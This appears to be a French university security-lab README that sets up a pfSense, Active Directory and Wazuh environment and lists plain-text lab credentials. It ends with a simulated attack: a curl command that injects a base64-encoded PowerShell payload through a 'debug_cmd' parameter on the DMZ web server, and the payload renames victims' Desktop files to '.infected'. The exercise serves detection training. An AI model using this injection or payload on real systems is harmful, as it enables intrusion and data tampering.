


<p align="center">
  <img src="uqac_logo.png" alt="Logo UQAC" width="180">
</p>
# Architecture du laboratoire
<p align="center">
  <img src="Architecture.png" alt="Architecture du lab" width="850">
</p>

<p align="center">
  <a href="#phase-exploitation"><strong>➡️ Aller directement à la phase d’exploitation</strong></a>
</p>

---

#  Étape 1 : Mise en place de l'Infrastructure Réseau

Cette phase initiale consiste à préparer l'environnement de virtualisation (VMware), à segmenter les réseaux et à configurer le routage central via pfSense.

---

## 1.1 Configuration des Réseaux Virtuels (VMware)

Avant de démarrer les machines, il est nécessaire de créer 5 segments réseau distincts (VMnets) via l'**Éditeur de Réseau Virtuel** de VMware :

| Nom du Segment | Sous-réseau (CIDR) | Rôle |
| :--- | :--- | :--- |
| **WAN** | `192.168.141.0/24` | Accès externe / Attaquant Kali |
| **LAN** | `10.10.1.0/24` | Réseau d'administration local |
| **DMZ** | `10.10.10.0/24` | Zone des serveurs exposés |
| **WINDOWS** | `10.10.20.0/24` | Parc informatique (AD & Clients) |
| **SOC** | `10.10.30.0/24` | Zone de monitoring (SIEM/Wazuh) |

---

## 1.2 Affectation des Interfaces Réseau

Chaque VM doit être connectée scrupuleusement aux segments définis ci-dessous. 

> **💡 Conseil crucial :** Notez l'adresse MAC générée par VMware pour chaque carte réseau afin de les identifier sans erreur lors de la configuration dans pfSense.

| Machine Virtuelle | Interface(s) Assignée(s) |
| :--- | :--- |
| **pfSense** | WAN, LAN, DMZ, WINDOWS, SOC |
| **Ubuntu DMZ** | **DMZ** (uniquement) |
| **Windows Server** | **WINDOWS** (uniquement) |
| **Windows 10** | **WINDOWS** (uniquement) |
| **Ubuntu SIEM** | **SOC** (uniquement) |

---

## 1.3 Configuration du Routeur pfSense



### Connexion initiale
1. Démarrez la VM **pfSense**.
2. Accédez à l'interface de gestion (Console ou WebGUI) avec les identifiants suivants :(j'ai mis les code pour que le professeur puisse vérifier meme si ce n'est pas une bonne pratique au vu du projets)
   * **Utilisateur :** `admin`
   * **Mot de passe :** `Superadmin2025.`

### Assignation des Interfaces (MAC Matching)
Une fois connecté, rendez-vous dans le menu **Interfaces > Assignments** :
* **WAN :** Affectez l'interface correspondant à l'adresse MAC du segment WAN.
* **LAN :** Affectez l'interface correspondant à l'adresse MAC du segment LAN.
* **DMZ / OPT1 :** Affectez l'interface du segment DMZ.
* **WINDOWS / OPT2 :** Affectez l'interface du segment Windows.
* **SIEM / OPT3 :** Affectez l'interface du segment SOC.

### Vérification de la Connectivité
* Assurez-vous que chaque interface possède l'adresse IP correcte (passerelle du sous-réseau).

#  Étape 2 : Démarrage des VMs et Inventaire des Accès

Une fois l'infrastructure réseau configurée dans VMware et les interfaces pfSense assignées, procédez au démarrage des machines selon l'ordre établi pour garantir la bonne distribution des adresses IP et la connectivité.

---

## 2.1 Séquence de Démarrage Préconisée

Pour éviter les erreurs de résolution réseau ou de communication avec le SIEM, respectez l'ordre suivant :

1.  **pfSense :** Indispensable pour le routage entre les 5 réseaux.
2.  **Ubuntu SIEM :** Pour que les services Wazuh soient prêts à recevoir les logs.
3.  **Ubuntu DMZ :** Serveur frontal exposé.
4.  **Windows Server :** Pour les services d'annuaire (Active Directory).
5.  **Windows 10 :** Poste client final.

---

## 2.2 Table des Identifiants et adresses 

Ces tableau répertorie tous les accès nécessaires pour l'administration et la réalisation du TP.

###  Vms et identifiants

| Machine | Utilisateur | Mot de passe |
| :--- | :--- | :--- |
| **Windows Server** | `superadmin@clinique.soc` | `Superadmin2025.` |
| **Windows 10** | `medecin@clinique.soc` | `Docteur2025.` |
| **Ubuntu DMZ** | `admin` | `Superadmin2025.` |
| **Ubuntu SIEM** | `admin` | `SOCoperator2025.` |

###  Interfaces d'Administration et SIEM Wazuh

| Service | Accès | Utilisateur | Mot de passe |
| :--- | :--- | :--- | :--- |
| **pfSense WebGUI** | `https://10.10.1.2` | `admin` | `Superadmin2025.` |
| **Wazuh Dashboard** | `https://10.10.30.10` | `admin` | `H4+d7rTUR5p6*iMt?3UJ*G6ki4rT.rEm` |

###  Serveur DMZ (Web) 

| Service | Lien 1 | Lien 2 | 
| **serveur web** | `https://reservation.clinique.soc` | `192.168.141.133`   |
| **Client mail** |  `https://reservation.clinique.soc/webmail` | `192.168.141.133/webmail` |

###  Identifiants DMZ (Web) 


| **Docteur** | `medecin@clinique.soc` | `Docteur2025.`   |
| **administrateur** |  `superadmin@clinique.soc` | `Superadmin2025.` |


## 2.3 Vérification Post-Démarrage

Avant de passer à la simulation d'attaque, effectuez les vérifications suivantes :
* **Connectivité :** Depuis l'Ubuntu DMZ, vérifiez que vous pouvez pinguer l'interface `10.10.10.1` (pfSense).
* **Service Web :** Assurez-vous que le serveur Apache/Nginx sur l'Ubuntu DMZ est actif et accessible depuis le WAN (si le NAT est configuré).
* **Wazuh :** Connectez-vous à l'interface Wazuh et vérifiez que les agents apparaissent comme "Active".


<a id="phase-exploitation"></a>

#  Étape 3 : Simulation d'Attaque (Scénario RCE & Phishing)

Cette phase simule une intrusion réelle. L'attaquant, situé sur le réseau **WAN**, exploite une vulnérabilité d'exécution de commande à distance (RCE) sur le serveur **Ubuntu-DMZ** pour infiltrer le réseau **WINDOWS**.

---

## 3.1 Objectif du Scénario
1. **Compromission de la DMZ :** Injecter un script malveillant via une faille Web.
2. **Mouvement Latéral :** Utiliser le serveur compromis pour envoyer un email de phishing interne.
3. **Exécution Finale :** Chiffrer (renommer) les fichiers sur le poste de travail de la victime.

---

## 3.2 Exécution de l'Attaque (Depuis Kali Linux)

### Phase 1 : Préparation et Injection du Payload
Le payload PowerShell ci-dessous est encodé en Base64. Une fois exécuté sur la cible Windows, il recherche les fichiers `.txt`, `.pdf` et `.doc` sur le Bureau pour les renommer avec l'extension `.infected`.

```bash
# Configuration de la cible DMZ (IP publique/NAT)
TARGET_IP="192.168.141.133"

# 1. Définition du payload PowerShell malveillant
payload="V3JpdGUtSG9zdCAiQW5hbHlzZSBkZSBzZWN1cml0ZS4uLiIgOyBHZXQtQ2hpbGRJdGVtIC1QYXRoICRIT01FXERlc2t0b3AgLUluY2x1ZGUgKi50eHQsKi5wZGYsKi5kb2MqIC1SZWN1cnNlIHwgUmVuYW1lLUl0ZW0gLU5ld05hbWUgeyRfLkZ1bGxOYW1lICsgIi5pbmZlY3RlZCJ9"

# 2. Injection du payload sur le serveur Web DMZ
# On crée un fichier 'update-urgent.ps1' accessible publiquement
curl -s -G "http://$TARGET_IP/" \
--data-urlencode "debug_cmd=echo $payload | base64 -d | sudo tee /var/www/html/update-urgent.ps1"
```
Connectez -vous sur le SIEM et pfsense pour voir les alertes :) 
Merci 

---
